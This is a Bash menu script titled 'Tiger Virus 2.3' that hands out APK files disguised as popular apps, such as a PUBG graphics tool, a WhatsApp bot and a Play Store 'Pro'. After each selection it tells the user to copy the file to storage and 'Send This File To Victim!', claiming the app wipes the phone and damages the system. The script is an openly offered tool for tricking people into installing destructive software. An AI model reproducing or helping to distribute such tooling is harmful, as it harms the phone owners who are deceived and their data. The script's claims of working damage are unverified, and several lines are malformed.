#!bin/bash
clear
echo -e "\e[1m\e[35m¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥\e[21m"
echo -e "\e[31m"
figlet "Tiger"
figlet "Virus 2.3"
echo -e "\e[31m"
echo -e "\e[1m\e[35m¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥¥\e[21m"
echo " "

echo -e "\e[31m VIRUS APPLICATIONS ( New 2021 ! ) "|pv -qL 20
echo -e "\e[96m___________________________________"
echo " "
sleep 1
echo -e "\e[91m[1]\e[35m Nature HD Wallpapers"
echo -e "\e[91m[2]\e[35m Termux Pro "
echo -e "\e[91m[3]\e[35m FF Lag Fixer "
echo -e "\e[91m[4]\e[35m Text Now Pro "
echo -e "\e[91m[5]\e[35m Insta Follow & Like "
echo -e "\e[91m[6]\e[35m PUBG GFX Tool"
echo -e "\e[91m[7]\e[35m Settings Pro "
echo -e "\e[91m[8]\e[35m Play Store Pro"
echo -e "\e[91m[9]\e[35m FF Diamond File"
echo -e "\e[91m[10]\e[35m Auto BOT For Whatsapp"
echo " "
echo -e "\e[31m •<<< When Anyone Install These Application  "
echo -e "\e[31m Their Phone Will Be Damaged ! >>>•" 
echo -e "\e[36m "
read -p "CHOOSSE AN OPTION : " optionapp
echo " "

if [ $optionapp -eq 1 ]
then 
echo -e "\e[32m~Downloading "Nature HD Wallpapers" Virus Application "|pv -qL 20
sleep 1
echo -e "\e[94m"
cd •
cp Nature_hd_walpapers. ..
cd ..
mv Nature_hd_walpapers. Nature_hd_walpapers.apk

echo "••••••••••••••••••100%"|pv -qL 10
echo " "
sleep 1
echo -e "\e[92mNature_hd_walpapers.apk File Downloaded Successfully"
echo " "
sleep 1
echo -e "\e[96mNow Type :- cp Nature_hd_walpapers.apk /sdcard "
echo -e "\e[96mTo COPY The Tvirus App File To "
echo -e "\e[96mYour INTERNAL STORAGE "
echo -e "\e[96mWhen Anyone Install This Application"
echo -e "\e[96mTheir Phone Will Be Damaged !"
echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
echo -e "\e[96mSend This File To Victim!"
elif [ $optionapp -eq 2 ]
then
echo -e "\e[32m~Downloading "Termux Pro" Virus Application "|pv -qL 20
sleep 1
echo -e "\e[94m"
cd •
cp Termux_pro. ..
cd ..
mv Termux_pro. Termux_pro.apk

echo "••••••••••••••••••100%"|pv -qL 10

echo " "
sleep 1
echo -e "\e[96mNow Type :- cp Termux_pro.apk /sdcard "
echo -e "\e[96mTo COPY The Tvirus App File To "
echo -e "\e[96mYour INTERNAL STORAGE "
echo -e "\e[96mWhen Anyone Install This Application"
echo -e "\e[96mTheir Phone Will Be Damaged !"
echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
echo -e "\e[96mSend This File To Victim!"

elif [ $optionapp -eq 3 ]
then
echo -e "\e[32m~Downloading "FF Lag Fixer" Virus Application "|pv -qL 20
sleep 1
echo -e "\e[94m"
cd •
cp Ff_lag_fixer. ..
cd ..
mv Ff_lag_fixer. Ff_lag_fixer.apk

echo "••••••••••••••••••100%"|pv -qL 10

echo " "
sleep 1
echo -e "\e[92mFf_lag_fixer.apk File Downloaded Successfully"
echo " "
sleep 1
echo -e "\e[96mNow Type :- cp Ff_lag_fixer.apk /sdcard "
echo -e "\e[96mTo COPY The Tvirus App File To "
echo -e "\e[96mYour INTERNAL STORAGE "
echo -e "\e[96mWhen Anyone Install This Application"
echo -e "\e[96mTheir Phone Will Be Damaged !"
echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
echo -e "\e[96mSend This File To Victim!"
elif [ $optionapp -eq 4 ]
then
echo -e "\e[32m~Downloading "Text Now Pro" Virus Application "|pv -qL 20
sleep 1
echo -e "\e[94m"
cd •
cp Text_now_pro. ..
cd ..
mv Text_now_pro. Text_now_pro.apk

echo "••••••••••••••••••100%"|pv -qL 10

echo " "
sleep 1
echo -e "\e[96mNow Type :- cp Text_now_pro.apk /sdcard "
echo -e "\e[96mTo COPY The Tvirus App File To "
echo -e "\e[96mYour INTERNAL STORAGE "
echo -e "\e[96mWhen Anyone Install This Application"
echo -e "\e[96mTheir Phone Will Be Damaged !"
echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
echo -e "\e[96mSend This File To Victim!"
elif [ $optionapp -eq 5 ]
then
echo -e "\e[32m~Downloading Insta Follow & Like Virus Application "|pv -qL 20
sleep 1
echo -e "\e[94m"
cd •
cp Insta_f_and_l. ..
cd ..
mv Insta_f_and_l. Insta_f_and_l.apk

echo "••••••••••••••••••100%"|pv -qL 10

echo " "
sleep 1
echo -e "\e[92mInsta_f_and_l.apk File Downloaded Successfully"
echo " "
sleep 1
echo -e "\e[96mNow Type :- cp Insta_f_and_l.apk /sdcard "
echo -e "\e[96mTo COPY The Tvirus App File To "
echo -e "\e[96mYour INTERNAL STORAGE "
echo -e "\e[96mWhen Anyone Install This Application"
echo -e "\e[96mTheir Phone Will Be Damaged !"
echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
echo -e "\e[96mSend This File To Victim!"
elif [ $optionapp -eq 6 ]
then
echo -e "\e[32m~Downloading Pubg GFX Tool Virus Application."|pv -qL 20
sleep 1
echo -e "\e[94m"
cd •
cp Pubg_gfx_tool. ..
cd ..
mv Pubg_gfx_tool. Pubg_gfx_tool.apk

echo "••••••••••••••••••100%"|pv -qL 10

echo " "
sleep 1
echo -e "\e[92mPubg_gfx_tool.apk File Downloaded Successfully"
echo " "
sleep 1
echo -e "\e[96mNow Type :- cp Pubg_gfx_tool.apk /sdcard "
echo -e "\e[96mTo COPY The Tvirus App File To "
echo -e "\e[96mYour INTERNAL STORAGE "
echo -e "\e[96mWhen Anyone Install This Application"
echo -e "\e[96mTheir Phone Will Be Damaged !"
echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
echo -e "\e[96mSend This File To Victim!"
elif [ $optionapp -eq 7 ]
then
echo -e "\e[32m~Downloading Settings Pro Virus Application"|pv -qL 20
sleep 1
echo -e "\e[94m"
cd •
cp Settings_pro. ..
cd ..
mv Settings_pro. Settings_pro.apk

echo "••••••••••••••••••100%"|pv -qL 10

echo " "
sleep 1
echo -e "\e[92mSettings_pro.apk File Downloaded Successfully"
echo " "
sleep 1
echo -e "\e[96mNow Type :- cp Settings_pro.apk /sdcard "
echo -e "\e[96mTo COPY The Tvirus App File To "
echo -e "\e[96mYour INTERNAL STORAGE "
echo -e "\e[96mWhen Anyone Install This Application"
echo -e "\e[96mTheir Phone Will Be Damaged !"
echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
echo -e "\e[96mSend This File To Victim!"
elif [ $optionapp -eq 8 ]
then
echo -e "\e[32m~Downloading Play Store Pro Virus Application"|pv -qL 20
sleep 1
echo -e "\e[94m"
cd •
cp Play_store_pro. ..
cd ..
mv Play_store_pro. Play_store_pro.apk

echo "••••••••••••••••••100%"|pv -qL 10

echo " "
sleep 1
echo -e "\e[92mPlay_store_pro.apk File Downloaded Successfully"
echo " "
sleep 1
echo -e "\e[96mNow Type :- cp Play_store_pro. /sdcard "
echo -e "\e[96mTo COPY The Tvirus App File To "
echo -e "\e[96mYour INTERNAL STORAGE "
echo -e "\e[96mWhen Anyone Install This Application"
echo -e "\e[96mTheir Phone Will Be Damaged !"
echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
echo -e "\e[96mSend This File To Victim!"
elif [ $optionapp -eq 9 ]
then
echo -e "\e[32m~Downloading FF Diamond File Virus Application"|pv -qL 20
sleep 1
echo -e "\e[94m"
cd •
cp Ff_diamond_file. ..
cd ..
mv Ff_diamond_file. Ff_diamond_file.apk

echo "••••••••••••••••••100%"|pv -qL 10

echo " "
sleep 1
echo -e "\e[92mFf_diamond_file.apk File Downloaded Successfully"
echo " "
sleep 1
echo -e "\e[96mNow Type :- cp Ff_diamond_file.apk /sdcard "
echo -e "\e[96mTo COPY The Tvirus App File To "
echo -e "\e[96mYour INTERNAL STORAGE "
echo -e "\e[96mWhen Anyone Install This Application"
echo -e "\e[96mTheir Phone Will Be Damaged !"
echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
echo -e "\e[96mSend This File To Victim!"
elif [ $optionapp -eq 10 ]
then
echo -e "\e[32m~Downloading Auto BOT For Whatsapp Virus Application"|pv -qL 20
sleep 1
echo -e "\e[94m"
cd •
cp Auto_bot_for_whatsapp. ..
cd ..
mv Auto_bot_for_whatsapp. Auto_bot_for_whatsapp.apk

echo "••••••••••••••••••100%"|pv -qL 10

echo " "
sleep 1
echo -e "\e[92mAuto_bot_for_whatsapp.apk File Downloaded Successfully"
echo " "
sleep 1
echo -e "\e[96mNow Type :- cp Auto_bot_for_whatsapp.apk /sdcard "
echo -e "\e[96mTo COPY The Tvirus App File To "
echo -e "\e[96mYour INTERNAL STORAGE "
echo -e "\e[96mWhen Anyone Install This Application"
echo -e "\e[96mTheir Phone Will Be Damaged !"
echo -e "\e[96mIt Will Delete All Contents In Our Internal Storage "
echo -e "\e[96mAnd Auto Reset and Damage all system!!! "
echo -e "\e[96mSend This File To Victim!"
              
else 
echo " "
echo -e "\e[95m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
echo "•••Sorry Please choose Correct OPTION•••"
echo -e "\e[95m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
fi
echo " "
echo -e "\e[92m========================================== "
echo -e "\e[93m[1] To Go Back"
echo -e "\e[93m[2] To Go Home"
echo -e "\e[93m[3] To Exit "

echo -e "\e[92m "
read -p "CHOOSE AN OPTION : " be 
if [ $be -eq 1 ]
then
bash app.sh
elif [ $be -eq 2 ]
then
bash TigerVirus.sh
echo -e "\e[39m"
else
echo -e "\e[39m"
fi
echo -e "\e[95m÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷"
echo -e "\e[103m     •••FOR MORE DETAILS•••. "
echo -e "\e[103mSEARCH *The Devil Tigers*"
echo -e "\e[103m       •••ON YOUTUBE•••      \e[49m"
echo -e " \e[39m"
echo -e "\e[95m÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷"
echo -e "\e[39m"








